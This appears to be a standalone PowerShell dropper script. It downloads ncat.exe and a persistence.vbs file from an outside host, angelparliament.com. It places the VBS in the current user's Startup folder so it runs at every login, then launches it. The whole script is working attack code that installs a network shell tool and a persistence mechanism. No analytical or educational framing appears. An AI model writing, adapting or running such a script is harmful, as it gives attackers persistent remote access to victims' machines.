$down = New-Object System.Net.WebClient
$user = $env:UserName
$url0 = "https://angelparliament.com/ncat.exe"
$file0 = "C:\temp\ncat.exe"
$url1 = "https://angelparliament.com/persistence.vbs"
$file1 = ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\persistence.vbs")
If ((Test-Path $file0) -eq $false){
	New-Item -ItemType File -Path $file0 -Force
}
If ((Test-Path $file1) -eq $false){
	New-Item -ItemType File -Path $file1 -Force
}
$down.DownloadFile($url0,$file0)
$down.DownloadFile($url1,$file1)
Set-Location -Path ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
Start-Process cmd -ArgumentList "/c start persistence.vbs"
